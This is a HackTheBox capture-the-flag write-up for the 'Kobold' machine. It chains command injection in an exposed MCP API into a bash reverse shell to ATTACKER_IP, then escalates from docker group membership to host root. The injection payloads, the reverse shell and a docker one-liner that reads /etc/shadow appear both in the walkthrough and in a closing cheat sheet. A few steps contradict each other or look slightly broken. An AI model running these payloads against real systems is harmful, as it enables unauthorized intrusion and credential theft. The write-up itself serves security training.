# Kobold - HackTheBox Writeup

**Target:** `TARGET_IP`
**Domain:** `kobold.htb`
**OS:** Linux (Docker-based)
**Difficulty:** Medium

---

## Attack Chain Overview

```
Nmap Scan (Ports 22, 80, 443, 3552)
    ↓
Virtual Host Discovery (kobold.htb, mcp.kobold.htb, bin.kobold.htb)
    ↓
MCP API Endpoint (/api/mcp/connect) → Command Injection
    ↓
Reverse Shell as ben → User Flag
    ↓
Docker Group Membership → Privilege Escalation
    ↓
Privileged Container Mount → Root Flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [User Flag](#user-flag)
4. [Privilege Escalation](#privilege-escalation)
5. [Root Flag](#root-flag)
6. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Host Setup
```bash
# What it does: adds machine domains to /etc/hosts.
# Why here: resolve virtual hosts during web enumeration.
echo "TARGET_IP kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### Nmap Scan
```bash
# What it does: run a full port scan using Nmap.
# Why here: identify all active services on the target to map the attack surface.
nmap -sC -sV -p- TARGET_IP
```

**Key Findings:**

| Port     | Service | Details                              |
|----------|---------|--------------------------------------|
| 22/tcp   | SSH     | OpenSSH                              |
| 80/tcp   | HTTP    | Web server (redirects to HTTPS)      |
| 443/tcp  | HTTPS   | Main web application                 |
| 3552/tcp | taserver| TeamAgent Server (non-standard)      |

### Web Application Enumeration

Accessing `https://kobold.htb/` revealed a contact page with an email address: **`admin@kobold.htb`**. This provided our first potential username for brute-forcing or credential stuffing later.

### Virtual Host Discovery

Discovered additional subdomains using gobuster:

```bash
# What it does: enumerate virtual hosts with Gobuster.
# Why here: find hidden subdomains like mcp.kobold.htb that are not listed in the main DNS records.
gobuster vhost -u https://kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -k
```

**Discovered subdomains:**
- `mcp.kobold.htb` — **MCP (Model Context Protocol) API endpoint**
- `bin.kobold.htb` — PrivateBin paste service

---

## Initial Access

### MCP API Enumeration

The `mcp.kobold.htb` subdomain hosts an MCP (Model Context Protocol) server with an API endpoint at `/api/mcp/connect`. This endpoint allows configuration of server processes via JSON payload.

**Endpoint Analysis:**
```bash
# What it does: probe the MCP connection endpoint with a test command.
# Why here: verify command execution by triggering a response from the MCP server logic.
curl -k https://mcp.kobold.htb/api/mcp/connect -X POST \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
```

**Vulnerability:** The `command` and `args` parameters are **not properly sanitized**. They are passed directly to a process execution function, allowing arbitrary command injection.

### Reverse Shell Exploitation

**1. Set up listener:**
```bash
# What it does: start a netcat listener.
# Why here: catch the incoming bash reverse shell from the MCP container.
nc -lvnp 4444
```

**2. Craft malicious payload:**
```bash
# What it does: exploit the command injection vulnerability via a crafted JSON payload.
# Why here: trigger a reverse shell back to the attacker's listener to gain initial access.
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "/bin/bash",
      "args": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],
      "env": {}
    },
    "serverId": "revshell"
  }'
```

**Payload Breakdown:**
- `command`: `/bin/bash` — Invokes the bash shell
- `args`: `["-c", "bash -i >& /dev/tcp/... 0>&1"]` — Standard bash reverse shell
- `serverId`: Arbitrary identifier for the MCP connection

**3. Reverse shell received:**
```bash
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:~$
```

**✅ Initial access achieved as user `ben`.**

---

## User Flag

```bash
ben@kobold:~$ cat /home/ben/user.txt
```

**User Flag:** `cat /home/ben/user.txt`

---

## Enumeration

### System Enumeration

```bash
# Check user identity
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

# Check sudo permissions
# What it does: audit sudo privileges for the 'ben' user.
# Why here: check for NOPASSWD entries or misconfigured sudoers rules that allow elevation to root.
sudo -l
# No sudo access

# Search for interesting files
# What it does: search for common configuration and sensitive text files.
# Why here: identify potential credential leaks in .conf, .ini or .txt files within the user's home or system directories.
find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.ini" 2>/dev/null | grep -v proc
```

### PrivateBin Data Discovery

Discovered `/privatebin-data/data` directory containing PrivateBin paste data. However, the paste IDs are required to access the content, and we don't have them yet.

```bash
# What it does: audit the PrivateBin data storage directory.
# Why here: verify if the current user has read access to sensitive paste data stored on the filesystem.
ls -la /privatebin-data/data/
# Contains hashed directory names (paste IDs)
```

### Docker Group Discovery

```bash
# Check group membership
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

# Check if docker binary is available
which docker
# /usr/bin/docker

# Test docker access
# What it does: list available Docker images.
# Why here: verify Docker daemon connectivity and identify available images for container-based privilege escalation.
docker images
# permission denied while trying to connect to the Docker daemon socket
```

**Critical Finding:** The user `ben` is **not in the docker group initially**, but the docker binary is available. Let's check group membership more carefully:

```bash
groups ben
# ben : ben operator docker
```

**✅ User `ben` is a member of the `docker` group!** The initial `docker images` command failed due to the Docker daemon not being fully accessible, but we can use `newgrp` to activate the group.

---

## Privilege Escalation

### Docker Group Exploitation

**Background:** Membership in the `docker` group is **equivalent to root access**. Docker containers run with root privileges by default, and mounting the host filesystem into a container allows full control over the host system.

### Why Docker Group = Root

| Risk | Explanation |
|------|-------------|
| **Container Escape** | Mount host `/` into container → full host access |
| **Privileged Mode** | `--privileged` flag gives container full host capabilities |
| **Filesystem Access** | Read/write any file on the host system |

### Exploit Steps

**1. Activate docker group:**
```bash
newgrp docker
```

**2. Verify group membership:**
```bash
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

**3. Run privileged container with host filesystem mount:**
```bash
# What it does: run a container with the host's root filesystem mounted.
# Why here: exploit the docker group membership to gain full read/write access to the host filesystem as root.
docker run --rm -it --privileged -v /:/hostfs --user root \
  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2
```

**Flag Breakdown:**
- `--rm` — Remove container after execution (clean up)
- `-it` — Interactive terminal
- `--privileged` — Give container full access to host devices
- `-v /:/hostfs` — Mount host root filesystem at `/hostfs` inside container
- `--user root` — Run as root inside the container
- `--entrypoint sh` — Override default entrypoint with shell

### Access Host Filesystem

Once inside the container:
```bash
# Verify host mount
# What it does: list the mounted host filesystem inside the container.
# Why here: confirm the mount was successful and that we can access the host's root directory.
ls /hostfs/
# bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

# Access root directory
ls /hostfs/root/
# root.txt

# Read root flag
# What it does: read the root flag from the mounted host directory.
# Why here: fulfill the final objective by capturing the root flag after bypassing container isolation.
cat /hostfs/root/root.txt
```

---

## Root Flag

```bash
# What it does: one-liner to extract the root flag via Docker.
# Why here: demonstrate a concise execution path to recover the final flag.
docker run --rm -i --privileged -v /:/hostfs --user root \
  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 \
  -c "cat /hostfs/root/root.txt"
```

**Result:** ✅ Root flag retrieved successfully.

---

## Alternative Escalation Methods

### Method 1: Docker SUID Binary

If docker is available with SUID bit:
```bash
# What it does: chroot into the host filesystem via a Docker container.
# Why here: gain a full interactive shell on the host system while remaining inside a container context.
docker run -v /:/host -it alpine chroot /host /bin/bash
```

### Method 2: Docker Socket Access

If `/var/run/docker.sock` is accessible:
```bash
# What it does: interact with the Docker daemon via the UNIX socket.
# Why here: verify if the Docker socket is accessible for administrative commands without group membership.
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | Nmap + VHost discovery | MCP API endpoint on `mcp.kobold.htb` |
| **Initial Access** | Command injection via MCP API | `/api/mcp/connect` — unsanitized `command` and `args` parameters |
| **User Flag** | Reverse shell as `ben` | Bash reverse shell payload |
| **Privilege Escalation** | Docker group membership | `docker run --privileged -v /:/hostfs` → host root access |
| **Root Flag** | Host filesystem mount | Read `/root/root.txt` from container |

### Security Lessons

1. **Never trust user input in API endpoints** — The MCP API accepted arbitrary commands without validation
2. **Docker group membership = root** — Never add regular users to the docker group
3. **Use rootless containers** — Docker rootless mode prevents this escalation path
4. **Network segmentation** — The MCP API should not be exposed externally without authentication

---

## MCP API Cheat Sheet

### Testing Command Injection

```bash
# Test basic command execution
# What it does: probe the MCP API for command injection.
# Why here: verify the vulnerability by triggering a safe command like 'id'.
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'

# Test with arguments
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"cat","args":["/etc/passwd"],"env":{}},"serverId":"test"}'

# Reverse shell
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"],"env":{}},"serverId":"revshell"}'
```

### Docker Group Exploitation

```bash
# Check group membership
groups

# Activate docker group
newgrp docker

# Mount host filesystem
# What it does: establish a privileged shell via container mount.
# Why here: provide a one-liner reference for escaping the container to the host filesystem.
docker run --rm -it --privileged -v /:/hostfs --user root alpine /bin/bash

# One-liner to read specific file
docker run --rm -i --privileged -v /:/hostfs --user root alpine -c "cat /hostfs/etc/shadow"
```



## Related Notes

- [mcp-api-injection.md](../../../exploits/web-rce/mcp-api-injection.md)
- [docker-group-escape.md](../../../privesc/linux/docker-group-escape.md)
- [nmap.md](../../../tools/recon/nmap.md)
- [gobuster.md](../../../tools/fuzz/gobuster.md)
